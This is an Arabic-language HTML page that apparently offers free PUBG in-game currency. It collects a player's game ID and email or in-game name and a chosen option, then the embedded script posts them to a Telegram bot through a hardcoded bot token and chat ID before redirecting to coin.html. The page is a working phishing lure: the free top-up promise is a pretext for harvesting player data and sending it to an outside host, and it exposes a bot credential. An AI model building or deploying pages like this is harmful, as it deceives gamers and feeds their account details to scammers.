<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> شحن مجانا الان</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a2e;
            color: #fff;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            padding: 20px;
        }
        .logo {
            width: 180px;
            margin-bottom: 30px;
        }
        .button {
            background-color: #00aaff;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .button:hover {
            background-color: #0088cc;
            transform: scale(1.05);
        }
        .form-section {
            display: none;
            text-align: center;
            margin-top: 30px;
        }
        .form-section input {
            padding: 12px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin: 10px 0;
            width: 90%;
            max-width: 400px;
        }
        .form-section input:focus {
            border-color: #00aaff;
            outline: none;
        }
        .form-section img {
            width: 120px;
            margin: 15px 10px;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .form-section img:hover {
            transform: scale(1.1);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
        }
        .coin-button {
            background-color: #00aaff;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }
        .coin-button:hover {
            background-color: #00aaff;
            transform: scale(1.05);
        }
        .selected {
            border: 3px solid #00aaff;
        }
    </style>
</head>
<body>
    <div class="container" id="mainSection">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgV2SE5Vn9bOGyQj0DUWNCsP-vGCJ1ayfhMqqobFNxHX4KoHOpSN76lORL6x4kdbk-PjZxs8r0iOGXMznlX72FPeWQVhHxtat8MexqtWZz0hlOSdHHIiuuVuVaMnzA2TnMLC3p3icb7jao44sPK3M9_65DyK-WCf8ImGXQiGaHYkSIKFj64cgOHnDyIWtg/s512/pubg_PNG40.png" alt="الشعار" class="logo">
        <button class="button" onclick="showForm()"> شحن مجانا الان</button>
    </div>

    <div class="form-section" id="formSection">
        <input type="text" id="gameId" placeholder="اكتب الأيدي الخاص بك">
        <input type="text" id="gameName" placeholder="اكتب الإيميل او اسمك باللعبة ">
        <div id="imageSelection">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiwt67mx4wSpWtxoSsyCUQNTnxZuV-8YnLYd38B_gcTW0LZdBDSR-ULnMabSZVF16ilN_WzFHmg9inp1CmBfKAd6terMScfsghbSOhp9ADpLhcw9b8jZ-I5FkgrIYsVRRXRlMjpjZTp1669p00rbwTgnYI3vMX6PbRaLAC4CdcCqW7sCtgfcbz9jEaYKs/s480/b96809_39dbb2e1756245acb73336c2a3b907b3~mv2.jpg" alt="الخيار 1" onclick="selectImage(this)">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxZ10Ez6czP2Oowmd2oWzXV0_azD-hc1FhpaCWTDeWMo5yCc4dpkXDHIoclJIkMyemytYp8DC6ZbHlyXCzqQXhIBZOzqOiuLUwmWlR_tBjDEARi2e5T1yOqMcZnmxdCclKRLMrL0jWEp6VINZFm3Cd3TLd8WL-T8DYrt8aly1SWmkK6V-puMAXpv4c-Wc/s600/b96809_24842172a40446359a8efd3044496711~mv2.jpg" alt="الخيار 2" onclick="selectImage(this)">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQ9T9S9-Izkf14sALYouv-yiahNXKHgG29QHRSlXZ8JOlrOpBUMvxl3MWF8-gvwjuGZTu57UQM4bdIn_jVaauOzbFXelf4TTdgUu04Q6HvcXyLtsX-ET10rirxhLqo0CHX8MUJsiAzm9s3Xe1bB6X6WdwRjaboX9XOSkyDUq6DR-NApSiLDIIGDhO6JE8/s600/b96809_9a2b13426d8141578fae4b81a3fe5571~mv2.jpg" alt="الخيار 3" onclick="selectImage(this)">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPyPpsOh276alfDg5ZXfadVsDRIwcR7iFf8mnYcr436ZAtjsHYj9b0C8YBYuYZobC5-xkaFCRQSqvjlnIbFr7pZVPGxD8hOgmFPtNtfJxMFmbrPyTI4wKQJoD_1_txt-qEQMUaNcdex-aAvCCBmqPj2B7dslrWcyXFcfFCktajvDBbtzjDDLaDDql8wRs/s480/b96809_4f4a21d135914ccba4c24a749e439cd7~mv2.jpg" alt="الخيار 4" onclick="selectImage(this)">
        </div>
        <button class="coin-button" onclick="validateAndSend()">التالي</button>
    </div>

    <script>
        let selectedImage = null;

        function showForm() {
            document.getElementById('mainSection').style.display = 'none';
            document.getElementById('formSection').style.display = 'block';
        }

        function selectImage(img) {
            const images = document.querySelectorAll('#imageSelection img');
            images.forEach(image => image.classList.remove('selected'));
            img.classList.add('selected');
            selectedImage = img.alt; 
        }

        function validateAndSend() {
            const gameId = document.getElementById('gameId').value.trim();
            const gameName = document.getElementById('gameName').value.trim();

            if (!gameId) {
                alert("يرجى كتابة الأيدي الخاص بك!");
                return;
            }

            if (!gameName) {
                alert("يرجى كتابة اسمك في اللعبة!");
                return;
            }

            if (!selectedImage) {
                alert("يرجى اختيار خيار من الصور!");
                return;
            }

            // معلومات البوت
            const botToken = "7841659071:AAGB0vllf_evaUJ23WhlKet8mAGkJofixcQ"; // استبدل بـ توكن البوت
            const chatId = "5555518543"; // استبدل بـ معرف الدردشة الخاص بك
            const message = `
                📝 *معلومات جديدة:*\n
                🆔 *الأيدي:* ${gameId}\n
                🎮 *الاسم في اللعبة:* ${gameName}\n
                🖼 *الخيار:* ${selectedImage}
            `;

            // إرسال البيانات إلى بوت تلجرام
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                }),
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'coin.html';
                } else {
                    alert("حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقًا.");
                }
            })
            .catch(error => {
                console.error("خطأ:", error);
                alert("حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقًا.");
            });
        }
    </script>
</body>
</html>
